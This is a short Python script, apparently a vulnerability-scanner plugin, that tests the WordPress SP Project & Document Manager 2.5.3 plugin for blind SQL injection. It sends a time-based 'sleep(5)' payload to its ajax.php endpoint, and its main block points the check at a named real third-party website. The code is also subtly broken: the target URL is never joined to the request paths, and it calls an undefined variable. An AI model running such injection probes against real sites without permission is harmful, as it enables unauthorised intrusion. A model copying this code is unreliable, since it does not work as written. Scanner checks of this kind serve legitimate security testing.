#!/usr/bin/env python
"""
WordPress SP Project & Document Manager 2.5.3 - Blind SQL Injection
http://www.exploit-db.com/exploits/36576/
"""
import time
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    ture_url='wp-content/plugins/sp-client-document-manager/ajax.php?function=thumbnails&pid=1'
    start_time1=time.time()
    code1, head1, res1, errcode1, _ = curl.curl2(ture_url)
    true_time=time.time()-start_time1

    flase_url='wp-content/plugins/sp-client-document-manager/ajax.php?function=thumbnails&pid=sleep(5)'
    start_time2=time.time()
    code2, head2, res2, errcode2, _ = curl.curl2(flase_url)
    flase_time=time.time()-start_time2
    if code1==200 and code2==200 and flase_time>true_time and flase_time>5:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.thegeorgefoundation.org/')[1])